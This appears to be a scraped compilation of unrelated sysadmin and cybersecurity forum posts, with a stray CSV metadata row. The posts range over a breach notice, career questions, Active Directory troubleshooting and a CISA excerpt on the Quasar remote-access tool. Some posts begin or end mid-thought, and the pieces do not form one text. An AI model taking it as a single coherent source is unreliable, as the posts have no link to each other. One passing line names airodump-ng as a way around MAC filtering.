Not sure if this is the right place to post this, admins feel free to delete if not. Notice of Data Breach November 1, 2019 What Happened? On October 16, 2019, NameSecure determined that a third-party gained unauthorized access to a limited number of our computer systems. As a result of this unauthorized access, account information may have been exposed and compromised. We encrypt passwords and credit card numbers, and no credit card data was compromised as a result of this incident. We believe the unauthorized access began in late August 2019. Upon discovery of this unauthorized access, the company immediately began working with an independent cybersecurity firm to conduct a comprehensive investigation to determine the scope of the incident, including the specific data impacted. We have also reported the intrusion to the federal authorities and are notifying affected customers. Safeguarding our customers information is core to our mission. We are committed to protecting our customers against misuse of their information and have invested heavily in cybersecurity and will continue to do so as we incorporate the key learnings of this incident to further strengthen our cyber defenses. What Information was Involved? Our investigation indicates that account information for current and former NameSecure customers may have been compromised. This information includes contact details such as name, address, phone numbers, email address and information about the services that we offer to a given account holder. We encrypt credit card numbers and passwords, and no credit card data was compromised as a result of this incident. What Are We Doing? NameSecure took immediate steps to stop the intrusion. We promptly engaged a leading independent cybersecurity firm to investigate and determine the scope of the incident. We notified the proper authorities and also began working with federal law enforcement. We have notified affected customers through email and via our website and as an additional precaution are requiring all users to reset their account passwords. What You Can Do We have taken additional steps to secure your account, and you will be required to reset your password the next time you log in to your NameSecure account. As with any online service or platform, it is also good security practice to change your password often and use a unique password for each service.

Ive been tinkering with computers my whole life and was happy to get into it as a career. I also have one semester left before I get my BA in Cybersecurity and General IT Studies. About a year ago, the network admin at my company (a local company thats been around awhile and does very well) left. Instead of replacing him, my boss decided to train up myself and another IT staff. Originally we were told we would be doing half NetAdmin and half our current jobs. After about 6 months our company is really growing, and we have hired 3 more people, who now do all of our old work. We are doing server administration, disaster recovery, virtual environment administration (Citrix and VMware), propgramming, database administration and much, much more. Now dont get me wrong.

I asked for 20% but my boss cited me being relatively new to the field and that I still had one item that took up the first hour and a half of my day from my old job (it was taken from me a month later). So looking around my area, Im making about 50-40% less than others in similar positions, and 30% less than entry level SysAdmin positions offer (which, according to their descriptions in overqualified for). I asked my boss about getting a mid-year review in December a couple months ago, and he agreed. I plan to talk to him tomorrow about the pay increase for it. I guess Im just ranting here but I want to know, am I off base to ask for 40%? How do I even ask for that much? Id really be happy with 30% (hell Id actually be alright with 20-25%), but 10% or god forbid 3% isnt going to cut it.

All tutorials repeat the same information on how to enable email encryption for 1 client at a time (File &gt; Options &gt; Trust Center &gt; Trust Center Settings &gt; Email Security &gt; select desired options), however I have had absolutely zero success in finding any type of documentation on how I would be able to do this for the whole company (!). Short of going to every single workstation individually and manually importing the SSL certificate and selecting the options, can anyone help elucidate a way that I might utilize this same functionality for the whole company? Perhaps and GPO? Any help will be much appreciated! Thanks ahead of time"

Appreciation goes to ZAFJB for this one. Our recent tip for a shortcut to get a 4-pane explorer in Windows, triggered this suggestion from SevaraB: ""You can do that for **an even larger grid of Windows by right-clicking the clock in the taskbar, and clicking 'Show windows side by side' to arrange them neatly.** Did this for 4 rows of 6 windows when I had to have a quick 'n' dirty ""video wall"" of windows monitoring servers at our branches."" ZAFJB adds that it actually works when you right-click ""anywhere on the taskbar, except application icons or start button."" This tip comes courtesy of shipsass: ""When I need to **use Windows Explorer but I don't want to take my hands off the keyboard**, I press Windows-E to launch Explorer and then Ctrl-L to jump to the address line and type my path. The Ctrl-L trick also works with any web browser, and it's an efficient way of talking less-technical people through instructions when 'browse to \[location\]' stumps them."" **Clear browser history/cookies** by pressing CTRL-SHIFT-DELETE on most major browsers.

We currently use a public wifi network that is open for employees to access the internet. We use ISE for mac address filtering for access but that can be bypassed using tools like airodump-ng. I know the network is separated from networks with sensitive data but having employee devices vulnerable seems like bad practice. Am I on the right track with my thinking? I am still learning but I am interested to get more input so I can come up with a presentation to impress the higher ups. Thanks!

I've been thinking of going back to education, as I only have about 2 years of college under my belt, but didn't finish my Associate's, which was an awful idea. It did lead to a helpdesk job for 1 year, as well as working as a printer technician for 2.5yrs. &amp;#x200B; I feel I've already had the quintessential ""college"" experience. I've grown older, I've gotten about as much experience and paygrade I believe I can get for my education level. While I was in college, I was interested in breaking into Cybersecurity, but never followed through. My current work has graciously offered to pay my way through college, which is nice. I feel I have too many current responsibilities between a second job, family and friends to go back to a regular in-person university, so I think doing online will be the best for my schedule, as well as cost. Now for the hard hitter questions: I'm looking at WGU currently, I'm either looking to hit their Cybersecurity track hard, and ride the BS all the way to the MS. I'm looking at WGU also because it includes certifications along the path to my degrees, I think that's an awesome plus, even though I've heard about renewing certs, which may only be a timed bonus. I've also thought about doing their Computer Science, getting the BS, and then going back for the BS in Cybersecurity, since some courses would also transfer. Would it be better to do just hard Cybersecurity, or also do Cyber+CompSci? Does anyone else have a different recommendation to a college? Thanks for your input."

I called the partner and found out he was in a critical condition with influenza type symptoms and had to be put into an induced coma to try and clear the infection in his lungs. It didnt sound good at all. I passed the message to my boss who then did all the HR type things. On saturday, my boss called me to let me know that my colleague had passed on. IT FUCKING HURT. I have only be at this job for 6 months but i actually really liked this dude. I was a very nerdy british guy that hardly spoke...but when he did, he had the wittiest quips and jokes. He was a huge history buff and had 2 young kids...probably under 10 that he would talk about occasionaly about how he was trying to teach them programming. He was a PhD in chemistry but traded that all for infosec because thats what paid bills he said. He was a lovely guy. I have two kids too and the thought of his kids made me choke up. It was all so sudden. He was at work on Wednesday...then saturday, he was gone. Today, we were all called into a meeting room by my boss for her to let everyone know. I was ok...until an hour or so later. I fucking bawled my eyes out. I couldnt help it. What do we do all this for when our lives can just be snuffed like that. Why do we fuss about stuff that doesnt matter? What is all this we are doing? I dont know man. All i know is that we ought to stay close to the ones we love and do the best with this little time we have. Take care of yourselves."

Basically there appears to be a program or service on their workstations and also affecting company windows phones that is making irregular attempts to authenticate with the DC - and the DC is throwing the error indicating a correct username but incorrect password. What is interesting is that the authentications always come in batches of 4 at a time and are almost never regular enough to lock out any accounts. My first suspicion is that this could be an application deployed across the network that is trying to authenticate with cached credentials that aren't stored anymore. But I'm not sure if such a thing should really be possible and I haven't worked closely with windows networks in a while. So my question is, does anyone know of any common services or applications that may run on workstations or phones that may attempt to iteratively authenticate with AD in such a manner (the 4 at a time pattern is noticeable). Will update if I find any more information from client, they are looking at their deployed apps as we speak. Thanks!"

I have a small, lab domain that I've been working on hardening to new security standards. I thought I had screwed something up massively, and I still haven't ruled that out. Domain members are not processing group policy. AD logons and logoffs are occurring with no issues. These machines simply are not getting group policy. Gpresult gives an error essentially saying that it couldn't connect to the domain controller. This is obviously not the entire case, as any domain member can ping the domain controller, log on via AD, etc. Things I have tried: - Completely disabling the Windows firewall for both client and domain controller - Moving a couple of client workstations to a test OU with no GPOs and inheritance blocked - Completely unjoining a couple of client workstations from the domain, deleting the computer accounts, and rejoining them to the domain - Using dcdiag and checking DNS to ensure nothing was hosed. Additional Details: - Full building power outage and client event logs point to GP processing problems that fit way too neatly with that timeframe. All machines are on UPS, but this is a secure lab that is locked when nobody is there. On the list has been to get a UPS software and script set up to automatically shut down machines in the event of a power outage. It's set up now, but we were in the building when the outage occurred. That's when I found out that the badge reader on the lab door was not on battery backup... Everything essentially hard crashed with no hardware errors reported. - No backups. Lab sysadmin is a side role. Cybersecurity is my job. Since taking over as lab sysadmin, I have been constantly talking about the need for a backup server. I was actually getting it set up, and our bureaucratic processes make that a slow process. I've been trying to get a backup server up and running for at least two *years* now, and I'm constantly having to go fight other fires and work on other projects. - nslookup shows a timeout, yet doing an nslookup against another domain machine by hostname resolves and shows the response came from the domain controller. - Domain controller logs show no errors that are standing out. Only clients are having issues. - Domain services otherwise seem to be functioning. It's not unusual for MS error messages to essentially *lie* about what's happening. Is there potentially a service on the DC that I've missed that may not be started? Logs are not indicating any services have failed to start. Domain login is working fine. It's only group policy that seems to have trouble. Any host firewalls between the DC and members have been eliminated (for my test workstations). The logs on members show that group policy issues started happening with the hard shutdown of the machines. I'm starting to think there's a corruption issue on the DC, but I'm not seeing event log errors that would point to this. My work environment is so bureaucratic that I can't so much as spin up another DC without a full reassessment and accreditation of this lab, including all plans, policies, and processes. I'm working on this in part to implement the new security framework, and all of the paperwork is more or less in progress. Are there any suggestions that don't involve finding a work environment that isn't such a constant shit show? I searched here and the web, and I'm not finding too much information."

One of the most common vectors of malware and spearphishing of privileged accounts. * Don't browse as root, and don't have ""Administrator"" privileges on your regular account. * Unstructured read-write fileshares replaced with alternatives like databases, webapps, versioned object storage. This limits the damage that can be done by any regular user account, in particular. * Hardened workstations or thin-client type devices like Chromebooks.

I've worked with their support in the past at an MSP and support really is incredible. I hope this doesn't change anything. We were also looking at trying out their SecureTide filtering service because of how awful Office 365's filters are, but I'm hesitant to do that with this news. I want to see what direction AppRiver is going to head before committing more services to them. Anyone else have any thoughts?"

I'm in IT261 which is a class that has us set up and manage Windows Server 2016. We set up a Domain Controller and it worked fine at the lab at school. However I decided that I wanted to try the same at home, but something went wrong... (This is on my home network) I was able to get the Domain Controller working and was able to set up DCHP, DNS and other mumbo jumbo for the domain. I was able to login to the domain from another node on the network and that node was able to access the internet. It appeared to all work fine. However, the Domain Controller itself couldn't connect to the internet (although it was connected to the network) (My home network router is a modem/router/switch combo). So my question is - What am I doing wrong? I have a couple of theories but need confirmation from someone that may know more. 1) DHCP was enabled on the router, potentially interfering with the DC. 2) Incorrect DNS settings on the router. 3)My domain name on the DC is not registered online (meaning I don't have ownership of it and it's not an actual reachable domain) which prevents me from accessing the internet. 4) I'm just stupid, made a stupid mistake and should quit IT altogether. Your help is greatly appreciated! Thanks in advance! u/davidlvdovenko"

1047,cybersecurity,sysadmin,"Need help with verifying a real or forged email, i'm familiar with the concepts but out of practice.",1,ajsq87,https://www.reddit.com/r/sysadmin/comments/ajsq87/need_help_with_verifying_a_real_or_forged_email/,2019-01-26 06:39:15,"Hi r/sysadmin, I'm hoping to lean on your technical skills for a personal issue... &amp;#x200B; About me: Years back I worked as a network engineer in a support team for a cybersecurity vendor, where I had regular experience with analyzing mail headers from spam/phishing sources. I've not done that kind of work in years now, but remain loosely familiar with the core concepts. I also haven't worked with a lot of Windows-based tools in a few years, having started working almost exclusively on Unix servers and databases. So I'm using Windows 10 and [Outlook.com](URL at a pretty basic level of expertise. &amp;#x200B; Tl;dr of my problem: Someone claims they sent me an email, I don't believe them and cannot find any evidence of the email in my inbox. How to determine/prove that they forged it without making accusations before I have evidence? &amp;#x200B; My problem: I have a situation in my personal life where I highly suspect that a property management agency that I rent my apartment from (who have already developed a history of incompetence in my personal dealings with them, and have a myriad of bad reviews online for unprofessional conduct) is trying to create a fake email claiming that they informed me of a situation that I am dead certain they told me nothing about. The resulting miscommunication has led to some problems, and there are are some pretty hefty financial costs involved in rectifying those problems. We're now debating liability; I think they're liable to cover those costs on the basis that they failed to tell me about the situation, but it seems I'll be forced to pay for it anyway if I can't prove that they didn't notify me. Even if I refuse to pay a bill, they could just withhold it from my deposit at the end of my lease. &amp;#x200B; I'm already suspicious of their claims because as soon as I mentioned wanting to investigate the miscommunication and asked them to provide proof that they told me about the situation, they immediately claimed that they only told me verbally on the phone, then later changed their story later and claimed to have sent it to me in an email, and then within 2 minutes of forwarding me their ""proof"" email (which is very brief and concise, only making short explicit statements of exactly what they need it to say to put all the liability on me), they offered to pay the costs 50/50 anyway provided that I stop looking into it, right after they had supposedly just proven that all of the blame lies with me. &amp;#x200B; The forwarded message they claim to have sent me is from mid-December 2018, and the message display header that you see when you forward a message with the basic ""From:, Sent:, To:, Subject:"" fields looks weird to me. The content and formatting is a little inconsistent with other messages that they've forwarded to me in the past (in terms of display names, addresses and mailto's being present, also date/time format) and a small part of me worries that they just copy/pasted the display header from a past message that fits their 'alternative' timeline, then doctored the addresses and subject line and tried to pass it off as something that was sent to me. I make this claim with a healthy degree of self-doubt though, as I'm pretty sure that forging an email to avoid an unwanted bill is committing fraud and would be a serious legal risk for them to take. But I still want to explore the events surrounding this email and try to work out why I never saw it. If it turns out they really did what I'm thinking, I'll lawyer up and see what my options are. &amp;#x200B; I have absolutely no record in my [hotmail.co.uk](URL account of having received any message from their domain on the date in question, nor any message from any domain ever with the subject line in question. So I guess my questions here are surrounding the identification and proof of a forged mail, as well as the validation of having never received it if it was at least an authentic message that they *tried* to send: &amp;#x200B; 1) Am I right in thinking/remembering that even if I ask them to send me their original sent item as a .msg file attachment (if one exists), the SMTP headers will be from before it was actually delivered, so tools like mxtoolbox header analyzer won't help me to trace if there was a delivery error at any point? 2) Is there anything else I can ask for, to help me determine whether or not they forged the email without necessarily straight up accusing them (perhaps wrongly) of committing fraud and demanding concrete evidence from their IT department? (If I'm wrong about the potentially fraudulent email, I'd rather not piss them off and see them retract their 50/50 offer!) &amp;#x200B; 3) Is there any more detailed way for me to interrogate my Hotmail account to find out if a specific message was ever received, even if I made a user error and accidentally deleted it or lost it in a folder somewhere that a standard [outlook.com](URL search won't check? I am absolutely 100% certain that I've not seen the message in question and didn't accidentally delete/move it, but I think I really need to consider the possibility and cover all bases. &amp;#x200B; I'm here all weekend, happy to answer questions and very grateful for any/all advice! &amp;#x200B;"

Quasar is authored by GitHub user MaxXor and publicly hosted as a GitHub repository. While the tool can be used for legitimate purposes (e.g., an organizations helpdesk technician remotely accessing an employees laptop), the Cybersecurity and Infrastructure Security Agency (CISA), is aware of APT actors using Quasar for cybercrime and cyber-espionage campaigns. &gt; Quasar was first released in July 2014 as xRAT 2.0. In August 2015, xRAT was renamed Quasar and released as v1.0.0.0. For this report, the National Cybersecurity and Communications Integration Center (NCCIC), part of CISA, analyzed Quasar version 1.3.0.0, which was released on September 28, 2016, and is the latest stable version available on GitHub. This report does not reflect any changes Quasars author has made to the tools source code since the release of v1.3.0.0. &gt; Open-source reports state that some APT actors have adapted Quasar and created modified minor (1.3.4.0) and major (2.0.0.0 and 2.0.0.1) versions.[1],[2] NCCIC has not determined the exact difference between these versions and v1.3.0.0. Therefore, NCCIC cannot definitively say whether the detection and mitigation recommendations provided in this report will work effectively against APT actor-modified versions of Quasar. "

We provide a lot of different services but the bulk of our business is Penetration Testing and Firewall &amp; SIEM Management. For the most part, our clients have IT Staff &amp; we therefore work as sort of a tier 3-4 support for companies who need our expertise for the security-specific stuff and advanced configs. Also, our business hours are M-F, 8-5 and we have an on-call rotation but all after-hours support is for emergencies only and is billed at $400/hour. We have a client, who for the rest of this story, I will call Adele. Adele has had a career for many years as a software engineer. Adele decided to take a job as the Head of Network Engineering at a very large and successful company who I will call ""MedHosters"", who hosts Servers, Websites, &amp; Databases for medical companies such as doctors offices &amp; hospitals. They mostly provide portals for doctors &amp; patients to log into, to access their medical records &amp; such. Since they must be HIPAA Compliant, we keep everything segments into VLANs and have a seperate WAF, etc. The security is very tightly defined in their firewalls; no ambiguous allow all policies anywhere. Also we provide all of our clients with diagrams and papers describing how everything in their network is configured, down to a T. Anyways, now that we are past the boring back story - Are you with me? Great! If not, then you're not reading this anyways, so forget you. Daily, and I mean EVERY SINGLE MF'N DAY, Adele calls &amp; emails \[at literally any time of the day\] and asks us dumb questions about how her firewall is configured and/or why something isn't working. Now, keep in mind, we do not manage her internal network and she knows this (we reminder her every time she asks a dumb question but in a nice way, of course). We just manage the North&lt;-&gt;South connections, in the Firewall, &amp; the East&lt;-&gt;West connections between the Firewall and their WAF. Typical questions from Adele include end-user-esque, ambiguous statements and other obvious things you would know if you knew anything about networking, whatsoever, like, ""Nothing is working. I think the firewall is dead."", ""I can't connect to 'Client XYZ's' portal, I think the firewall is broken."", ""Are our websites protected against DDOS? What is DDOS?"", ""Our Client wants to know if there anything protecting their portal...? As far as we can tell it's just wide open to the world."", &amp; another one of my personal favorites - ""One of our clients is asking about our wireless connection at our office. Do wireless connections authenticate? What is Wireless Authentication?"" --- Nope lady. No authentication, no encryption. Nothing. You guessed it --- Your HIPAA Compliant environment, which is using WPA2 Enterprise and the only WAPs in the entire world that actually provide Full WIPS by automatically detecting &amp; preventing the 6 known Wi-Fi threat types simultaneously - the WatchGuard AP420), has wide open WiFi just begging for the rest of the world to hack in and steal all your medical records... \*Insert picture of steam coming out of my ears here\*. &amp;#x200B; So, last week I was dead asleep, probably dreaming of being on a tropical island or some other cool crap, &amp; I get woken up to the blaring sound of my phone ringing. Still 1/2 asleep, I look over at my phone and notice its my work/VoIP line that's ringing and it's barely 5:00 AM (I am on call this week, so I unfortunately have to answer). I pick up the phone and with a groggy voice I give my classic speal, ""&lt;MY COMPANY'S NAME&gt; this is &lt;MY NAME&gt; how may I help you?"" (You guessed it... its Adele... Actually, ya know what? Forget Adele. Adele is a pretty name and this lady is dumb as rocks, for the rest of the story I shall call her Bertha. Back to this story now.) In a panicked voice I hear Bertha say, ""HELP! I think the firewall is completely broken again! I cannot connect from to 'Server A'."" So, I ask her for the IPs and Subnets of the servers she is trying to connect to and I try to ping those devices to ensure they are online; they are not. So, I login into her firewalls and I realize that those IPs that Bertha gave me are not even part of any the subnets in her Firewall or WAF. I proceed to inform her of this information and then ask her for the FQDN of the servers she is trying to connect from and to. She responds with, ""What is a FQDN?! I just need to connect to my WebServer. Our Database Engineers had a question about the servers."" So, I work with her for nearly 15 minutes and eventually get the IP of the server she is trying to connect to (it is one of the WebServers that is behind their WAF.) but I am unable to get Bertha to run an ipconfig command to get me IP of the computer she is on. So, I proceed to spend another 15-20 minutes working with her to setup a remote session to share her screen with me (this should normally take 2 minutes or less, even for most end-users. We use ScreenConnect/ConnectWise Control). Once I am remoted into her computer (that she had told me was a server) I immediately realized that this is not a server but a Windows 10 Home laptop... With further questioning, I come to find out she is working at home and she was trying to RDP into one of her WebServers at their office, using the local credentials for her home laptop. She was literally trying to RDP from her home network into a WebServer that is behind a Firewall and a WAF and she's not even on the same network... Ya know, as if the internet worked like magic and it just knew that she was trying to connect to a server, via its private IP, on a network 50 miles away, hosted in a building with biometric security and protected by state-of-the-art firewalls and it would just route her right to it... \*More steam coming out of my ears\* - To add even more context - per her very specific request from a couple of weeks ago, the WebServer that she is trying to RDP into is configured so that you can only access it by RDP-ing to it from 1 other specific server, 'Server b', which is on a seperate VLAN. So, the only way she would be able to access it from home would be to SSLVPN into their firewall, then RDP from her laptop into 'Server B' and then RDP into the WebServer. So I proceeded to setup her up with VPN account in the Radius server and then setup the VPN and RDP her from 1 server to the next so that she could get in... I proceeded to explain to her why it was not working and how to login/connect with the VPN. &amp;#x200B; \*WAIT THERE'S MORE!\* &amp;#x200B; Once I get her into the WebServer she says. ""I'm still not sure why it wasn't working. How did you bring the server back online. \*FACE-PALM\* I reminded her know it was always online and that she needs to actually be connected to their network to connect to the WebServer. She responds with, ""Oh... okay. So, it's all working now, though, right? And it will be online next time?"" \*ACTUAL FACE-PALM.. AND I ACCIDENTALLY POKED MYSELF IN THE EYE SO NOW I'M EVEN MORE PISSED OFF\* I say, ""Yes. And just out of curiosity, what are you working on that is so urgent that you and the Database engineers are working on that had to call at 5:00 AM for after-hours support?"" ""She replies with, ""Well, I just needed to know which version of windows this server was running. They needed the answer by the end of the day and I panicked when I noticed that the server was offline, so I called you. Thanks for bringing the server back online.""... I mean how does one respond to a comment like that... Ugh... Some people will just never get it. &amp;#x200B; Moral of the story - If She Can Get A Job As A Network Admin, Anyone Can &amp;#x200B; TL;DR - Incompetent Network admin calls me at 5:00 AM panicking that her WebServers are offline but in actuality, she was at home trying to RDP from her laptop to a WebServer that is behind 2 firewall, using her laptop's local credentials... and in the end she still was convinced the server was offline and I fixed it."

Recently I attended the NKU 11 Annual Cybersecurity Symposium. I was amazed at how many lawyers were present. Which leads me to a couple of questions. 1. With your experience, have legal questions about technology begun to intercede the procedural and policy making steps for new technology? Existing Technology? 2. Have you noticed any movement in the IT industry to incorporate more legal trust boundaries or threat analytics because of the possible over lap between being ""hacked"" and being liable for the hacking? GCR (governance, compliance, risk) seems to be a growing trend among bigger firms and businesses. My wife is trying to get into the legal side to help companies cover their bases from the foundation to the C-Suite operations. She is getting a lot of push back about this, because she wants to add the legal side as well as threat analytics to the process. Right now where she works they have a ""silo"" effect between technology and GCR. Which seems to be more of a separation due to mentality of the work. Would anyone care to help me through some possible trappings to this? Its honestly getting to the point, that in conversations she is leaving me behind. I think of things in the secure to protect mind set, while she thinks in the mitigate risk to protect mind set. How do we bridge that gap? (Likely my fault for not thinking like she can)"

I have taken courses in Cisco systems that trained me for the CCeNT and CCNA. Server 2016 classes that trained me for three Microsoft certs that cover installation and configuration, identity management with OUs and group policy, and networking. The Cybersecurity classes covered security +, CySA, CEH, and CCISP. I am currently working as an intern in my schools IT department and also the president of the computer club, which runs a pc repair clinic that services students and staff personal computers and various tech devices. On a personal level I have been using computers since the 80's and have experience in every windows OS. I am just curious how marketable these skills are in the system admin sector. I am not super interested in networking, and security with a 2 year degree is nearly impossible to get in to from what I've heard. I enjoy working with server 2016 and virtual machines. I am really terrible at taking tests and am not sure if I would be able to pass any certification tests. So I am wondering, from your experience in the field, what would be a good career to aim for when I graduate? Are certs the only way to get jobs in the field as most of my professors are saying? I appreciate any insight anyone may have on this. "

Made my way to the top of the help desk technicians, then moved into a disaster recovery management role by myself. None of our clients can be considered ""enterprises"", in that their technology is all single-domain with site-to-site VPNs connecting them all. Nothing more fancy than that. So I'm trying to move out and up from this company but find myself sabotaged by my lack of enterprise-level experience. I attempted the MCSA in Server 2016 but failed due to my lack of real-world experience with large networks. My BDR experience is limited to 3rd-party software (Datto, Acronis, Veeam) leveraged against simple NAS devices. I've been in IT for 3 years now (not a lot, I know - most positions want 5 years or more before they'll look at you) and am halfway through my Masters in Cybersecurity, but find the bar of entry for security analysts at any company to be comically high. I am in management at my current company and also was an IT manager for another small business before this position, but feel like the only way I'd survive at a large corporation would be to start over on the help desk. As a military vet I'm used to career counselors who guide you on what you should be studying and where you should be striving to go, but I feel like I'm flailing and rotting where my skills aren't being put to use more often than not.

(College student here) **Ok so the TLDR version:** is that I signed up to help setup a lab to run about 300 mostly **Windows** VMs in a simulated enterprise setting with AD, traffic/threat generators, IDS, honeypots etc. Lab is supposed to be air gapped and used for cybersecurity exercises. There are apparently plans to scale the lab up further to perhaps around 100 VMs. Unfortunately, my project lead doesn't seem to be very knowledgeable (to put it nicely) and I feel like I am running the show although I am extremely short handed and not very prepared. The main problems I am facing is that **there doesn't seem to be budget for VMWare or whatever Microsoft datacenter management solution**, hence I'm trying to make do with Proxmox/Ceph. I looked at OpenStack/Cloudstack/OpenNebula but I don't feel capable of deploying those. However, I'm really wondering if I made the correct choice with Proxmox/Ceph. (Before I came on board, the guy was managing Hyper-V individually on servers using monitor/keyboard/mouse. He seems fascinated by Proxmox/Ceph lol) I'm just here and forging ahead. Currently facing some problems with initialising the Proxmox cluster, but I'm sure I'll figure it out eventually. My questions now are: * Am I making the right choices? Any better ways of doing things? * How to manage 300 Windows VMs? How to orchestrate/revert to snapshot. Manage (lack of) Windows licenses * Manage an air gapped environment. How to install stuff / get updates etc. * Anyone done similar things before want to offer any advice?

I have a fair bit of experience in IT, but never past helpdesk and some management. I have a passion for networking, security, and just tinkering with computers whether that means setting up personal cloud servers, or making projects with a raspberry pi, but long story short I want to progress a bit past my prior experience. As for my work experience already, I started as an intern and became a Computer Repair Technician for my school district totaling about 3 years of experience here put together from summers and high school years. After this last summer ended they didn't have enough work to justify keeping me for the whole year so I was dismissed and I saw this as an opportunity to step into a bigger role in which I felt more fulfilled. My sophomore year (this past year) in college I worked as a helpdesk consultant at a pilot program at my university to replace the in-house grad student computer help, and for the last semester I was promoted to a team lead for that program and was expected to continue this year before I decided to take a year off. I am going to school for Computer Science in the system track in a well-ranked university, and ultimately wanted to go into cybersecurity upon graduation, but am very interested in the possibility of becoming a system administrator as a stepping stone. My grades weren't fantastic, and were part of the reason for my hiatus, but I have taken several relevant classes that make for good resume material in addition to my work experience. &amp;nbsp; My hesitation is this: I will only be here until next September before leaving for uni out of state again, and I wanted to consult with this sub to see if that was disrespectful to any company that apply to, to use them for a year to gain experience and resume material before leaving them for at least two years if I ever came back period. I feel uncomfortable applying to these positions knowing that I don't intend to stay there for very long. If this isn't immediately an issue, at what point should I inform them that I intend to leave in less than a year, during the interview? Thank you all in advance for taking the time to read this, and for any help you're able to give. I really appreciate it. &amp;nbsp; TL;DR: I have a passion for computers and want to apply for a sysadmin job, but I'm unsure of how it would be received if I only plan to stay for 10-11 months at the job before returning to school."

I very often come back to this subreddit and almost always find a post where documentation is one of the issues that they have, so I want to share my little story. I thought &gt;This is never going to happen in the company that I work for. I work for a cybersecurity company and up until 1 month ago, I was mainly focused on copy pasting logs from monitoring systems, closing false-positives and eyes on screen tasks. Anybody with little to no experience could come in and learn everything in about 1 week, because (surprise, surprise) I made sure to document everything. (I swear you guys are really helpful, thank you) When you are in T1, everything needs to be documented to the last copy paste. Mainly because I'm very skeptical by nature and I want for everyone to have as a little failure rate as possible. The way that T1 works in our case, is that we have multiple customers (4) and we help with the first response. The first customer, me and another colleague we're selected to go (for 2 months consecutively) to help out with their tickets. The second one I got promoted to be a sysadmin, but I will focus on the first one. Me and another colleague were selected to visit our main headquarters to actually learn about T2 tasks (AD changes, O365 Admin Center, etc.), **which** are relatively easy in nature. When he went first, he did manage to do certain things, but many things we're left unclear (how the local AD works with O365, why is there an LDAP instance, where should we make the changes first, etc.) and making documentation was like shooting in the dark. Soooo it was my turn. This is how it went: Day 1: This is not that bad. Can be easily fixed. Day 2: Hmm. Still, just a little clarity in certain areas, moving some information from hear to there and it's fine. Day 3: HOW FAR THOSE THE RABBIT HOLE GO??? . . Day 7: I need to be a professional writer, data scrapper and researcher. With all that said, the documentation wasn't bad, but **IT COULD BE HEAVILY IMPROVED UPON.** The main issue was that the documentation was ok at best, and misleading at worst. Never non-existing. I also managed to fix a lot of the tickets (which surprisingly isn't that hard, just time consuming). I learned a couple of things, things that I want to pass to other possible future sysadmins: * Learn to be adaptable - I can't stress this enough. Knowing how to google is probably your biggest strength, if not, make it. Just because you don't have your answer in the company's docs, research and then PLEASE write it down. * Ask everyone and everywhere - I was surprised when I started asking around randomly and I would get my answers from so many different people and depts. They might not have time, but ask, send an email, send a text. Find your answer. * Learning by doing - If you are working in a company that has an IT dept, get an idea how it works. No certification, course or tutorial will tell you better what your company is running. * And obviously, document everything - There is no such thing as too much documentation. I would rather prefer filtering the info, rather than asking for the Golden Grail. (Greenshot for Windows and MacOS and Flameshot for Linux are amazing screenshoting tools) Let me know if you have any questions. I will be boarding the plane in about 40 min so apologies if I might have \~ 2 hours of no responses. :)"

I'm the sole IT Admin of a 50 person firm that does software development and integration/support. Our devs work on one product, and our support teams support that product. We have the usual mix of HR, finance, sales and all the support staff behind it. There are also a handful of side projects that the guys work on, but nothing that's sold yet. We work closely with customers in the federal government, so we are required to be compliant with NIST 800-171. I had to rebuild the entire infrastructure including a new active directory domain, a complete network overhaul and more just to position us to become compliant. I have an MSP who does a lot of my tier I work and backend stuff like patching (though managing them costs me nearly as much time as it would take me to do what they do). Day to day, I may find myself having to prepare for a presentation to the Board on our cybersecurity program, and on the next I am elbows deep trying to resolve a network issue. I'm also involved in every other team's project (HR is setting up a wiki page and needs help, finance is launching a new system that needs SSO, sales is in a new CRM that needs SSO etc) Meanwhile I also manage all of our IT inventory, write all of the policies and support several of our LOB apps because nobody else knows them. Boss understands I have a lot to manage, but won't let me hire a junior sysadmin as 2 IT guys for 50 people won't sell to the board. I have done some automation, but I barely have time to spend on any given day to actually write a script good enough to save me a bunch of time. I have nearly no time to learn anything technical, as I'm learning how to run an IT Dept, how to present and prepare materials for the execs, staying on top of security reports and on calls with our government overseers. I spend time with the dev teams trying to help them fix their CI/CD tools, and then I get pulled away to help a security issue, then I have to work out an issue with my MSP, then the phone company overcharged our account, then someone goes over my head to try and get the CEO to approve a 5k laptop. I see job openings for senior sysadmins, IT managers, and cloud engineers; I don't meet the requirements for any one of those jobs, and I don't see how I could get those requirements met without leaving my job to go be a junior sysadmin somewhere. How the hell do you progress as a sole Admin? I can't in good faith sell my company on high end tech we don't need, so I can't get the experience that would progress my career. I can already sense I'm at the ceiling of where I can go as an IT generalist.. I never see any jobs looking for a Jack of all trades IT admin- err, I occasionally see this job but the pay is generally one rung above helpdesk work. Is there any way to stay in this kind of job and not fall behind the more technically deep peers? Wat do?"

Since May 2016, APT actors have used various tactics, techniques, and procedures (TTPs) for the purposes of cyber espionage and intellectual property theft. APT actors have targeted victims in several U.S. critical infrastructure sectors, including Information Technology (IT), Energy, Healthcare and Public Health, Communications, and Critical Manufacturing. This Technical Alert (TA) provides information and guidance to assist MSP customer network and system administrators with the detection of malicious activity on their networks and systems and the mitigation of associated risks. This TA includes an overview of TTPs used by APT actors in MSP network environments, recommended mitigation techniques, and information on reporting incidents. URL "

I love the work I do. I love making things work more efficiently. I love being able to make jokes and have fun in the office. I love my job. There's a lot more to be said, but I'd be droning on about it forever. Point is, there's so many great places to work. If you're in a spot that you hate your job- you'll find one you love soon enough. I've been extremely blessed to have had so many wonderful jobs and people in my life. "

I've been casually playing with networking &amp; the web for 20 years, and also have some minor programming experience - I'm no genius, but I've got a natural affinity for the stuff. Recently I started watching network admin videos and found that I'm more comfortable with it than I'd previously realized - so I've gotten serious, have built a home lab, and am tackling CCNA, at my own pace. Let the good times roll. I work in cybersecurity, on the business side of things, and have recently realized that my natural affinity for this stuff puts me in better shape than at least some of the 'tech-side' guys I work with who stumbled their way into IT. A business-tech professional profile would really be a boost to my job market value - except there's nothing in my CV that differentiates me from joe-shmoe sales and marketing guy. Combined with my elite google-fu, I'm sure I could handle more tech-heavy roles: customer success, sales engineering, etc. What I need on my CV is something that says ""actually quite technically competent"" - and while CCNA would do all that and then some, it'll likely be a multi-year project (if I get to testing at all) - so I'm wondering if there's something that has some industry acceptance, but is also fairly easy to get in terms of study time required. I'm also wondering if there's an entry-level exam that I could walk into after a month of study and pass. tl:dr - looking for the quickest way to getting an IT cert to demonstrate to hiring managers that I've got basic tech competence.

